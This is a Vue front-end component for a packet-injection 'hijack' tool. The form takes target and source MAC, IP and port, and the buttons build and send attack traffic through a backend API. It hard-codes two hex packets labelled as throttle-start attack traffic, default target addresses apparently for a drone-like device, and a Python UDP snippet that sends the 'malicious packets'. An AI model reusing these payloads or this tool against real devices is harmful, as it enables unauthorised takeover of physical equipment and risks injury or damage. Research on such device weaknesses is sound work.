<template>
  <div id="start-hijack">
    <a-card title="设置目标参数">
      <template #extra>
        <a-button type="primary" @click="resetToDefaults">填充默认值</a-button>
      </template>

      <a-form :layout="formLayout" :model="formState">
        <a-row :gutter="24"> <!-- 设置列间距为 24 -->
          <!-- 左列 -->
          <a-col :span="12"> <!-- 占据 12 列（即一半宽度） -->
            <a-form-item label="目标MAC地址">
              <a-input v-model:value="formState.dstMac" placeholder="请输入目标MAC地址 (dst_mac)" />
            </a-form-item>
            <a-form-item label="目标IP">
              <a-input v-model:value="formState.dstIp" placeholder="请输入目标IP (dst_ip)" />
            </a-form-item>
            <a-form-item label="目标端口">
              <a-input v-model:value="formState.dstPort" placeholder="请输入目标端口 (dst_port)" />
            </a-form-item>
          </a-col>

          <!-- 右列 -->
          <a-col :span="12"> <!-- 占据 12 列（即一半宽度） -->
            <a-form-item label="源MAC地址">
              <a-input v-model:value="formState.srcMac" placeholder="请输入源MAC地址 (src_mac)" />
            </a-form-item>
            <a-form-item label="源IP">
              <a-input v-model:value="formState.srcIp" placeholder="请输入源IP (src_ip)" />
            </a-form-item>
            <a-form-item label="源端口">
              <a-input v-model:value="formState.srcPort" placeholder="请输入源端口 (src_port)" />
            </a-form-item>
          </a-col>
        </a-row>
      </a-form>

    </a-card>

    <div class="container-button">
      <a-button
        type="primary"
        @click="handleClickMakeTraffic"
        :loading="isLoadingMakeTraffic"
        class="normal-button"
        danger
      >
        构造流量
      </a-button>
    </div>

    <TrafficDisplayGeneral/>

    <a-card title="socket代码">
      <pre><code class="language-python">{{ pythonCode }}</code></pre>
    </a-card>

    <div class="container-button">
      <a-button
        type="primary"
        @click="handleClickAttack"
        :loading="isLoadingAttack"
        class="large-button"
        danger
      >
        执行攻击
      </a-button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import TrafficDisplayGeneral from '@/views/TrafficDisplayGeneral.vue'
import { executeStartHijack } from '@/api/executeStartHijack.ts';
import type { GetPacketParams } from '@/utils/types'
import { useTrafficHexStore } from '@/stores/useTrafficHexStore.ts'
import { useTrafficHexStore2 } from '@/stores/useTrafficHexStore2.ts'
import { getPacket } from '@/api/getPacket.ts'

const formLayout = 'vertical'; // 设置表单布局

// 油门启动攻击流量
const trafficData1 = "ef0258000202000100000000d5000000140066148080b38000020000000000000000000031990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";
const trafficData2 = "ef0258000202000100000000d7000000140066148080ff800002000000000000000000007d990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000324b142d0000";

// 获取流量pinia对象
const trafficHexStore = useTrafficHexStore();
const trafficHexStore2 = useTrafficHexStore2();

// 定义初始值对象
const defaultValues = ref<GetPacketParams>({
  dstMac: 'b8:3d:fb:5d:7e:ef', // 目标MAC地址
  dstIp: '192.168.169.1',      // 目标IP
  dstPort: 8800,               // 目标端口
  srcMac: '12:34:56:78:9a:bc', // 源MAC地址
  srcIp: '192.168.169.2',      // 源IP
  srcPort: 12345,               // 源端口
  trafficHex: { trafficData1, trafficData2 }
});

// 创建一个对象来存储表单的状态
const formState = ref<GetPacketParams>({
  dstMac: '',
  dstIp: '',
  dstPort: 0,
  srcMac: '',
  srcIp: '',
  srcPort: 0,
  trafficHex: { trafficData1, trafficData2 }
});

// 创建一个方法来重置表单状态为初始值
const resetToDefaults = () => {
  formState.value = defaultValues.value;
};

const pythonCode = ref( `import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 创建原始套接字
sock.sendto(traffic1, (dst_ip, dst_port)) # 发送恶意流量包
sock.sendto(traffic2, (dst_ip, dst_port))
sock.close() # 关闭套接字
`);

onMounted(() => {
  // 这里爆红不用管，已经全局引入了。 放在onMounted里面可以保证其他组件加载完毕后 再引入prism进行代码高亮
  import('prismjs').then(prism => prism.highlightAll());
});

// 处理按钮点击事件的方法
const isLoadingMakeTraffic = ref(false);  // 按钮的状态
const isLoadingAttack = ref(false);

const handleClickMakeTraffic = async () => {
  try {
    // 设置按钮加载状态为 true
    isLoadingMakeTraffic.value = true;

    // 调用 getPacket 接口
    const response = await getPacket(formState.value);
    console.log(response.data);

    // 获取 data 对象中的所有字符串值
    const stringValues = Object.values(response.data);

    // 打印每个字符串值
    stringValues.forEach((str, index) => {
      console.log(`流量 ${index + 1}:`, str);
    });

    // 设置流量内容
    trafficHexStore.setTrafficHex(stringValues[0]);
    trafficHexStore2.setTrafficHex2(stringValues[1]);

    // 获取流量内容
    const trafficHex = {
      trafficHex1: trafficHexStore.trafficHex,
      trafficHex2: trafficHexStore2.trafficHex2
    }

  } catch (error) {
    // 处理错误
    console.error('There was an error!', error);
  } finally {
    // 不管请求成功与否，最后都将加载状态设置为 false
    isLoadingMakeTraffic.value = false;
  }
}

const handleClickAttack = async () => {
  try {
    // 设置按钮加载状态为 true
    isLoadingAttack.value = true;

    // 获取流量内容
    const trafficHex = {
      trafficHex1: trafficHexStore.trafficHex,
      trafficHex2: trafficHexStore2.trafficHex2
    }

    // 调用 executeStartHijack 接口
    const response = await executeStartHijack({
      dstMac: formState.value.dstMac,
      dstIp: formState.value.dstIp,
      dstPort: formState.value.dstPort,
      srcMac: formState.value.srcMac,
      srcIp: formState.value.srcIp,
      srcPort: formState.value.srcPort,
      trafficHex: trafficHex
    });

    // 根据后端返回的数据执行相应操作
    // console.log(response.data);

  } catch (error) {
    // 处理错误
    console.error('There was an error!', error);
  } finally {
    // 不管请求成功与否，最后都将加载状态设置为 false
    isLoadingAttack.value = false;
  }
};
</script>

<style scoped>
.container-button {
  text-align: center;
  padding: 20px;
}
.normal-button {
  width: 150px; /* 设置宽度 */
  height: 40px; /* 设置高度 */
  font-size: 14px; /* 可选：增加字体大小以适应更大的按钮 */
}
.large-button {
  width: 200px; /* 设置宽度 */
  height: 50px; /* 设置高度 */
  font-size: 16px; /* 可选：增加字体大小以适应更大的按钮 */
}
</style>
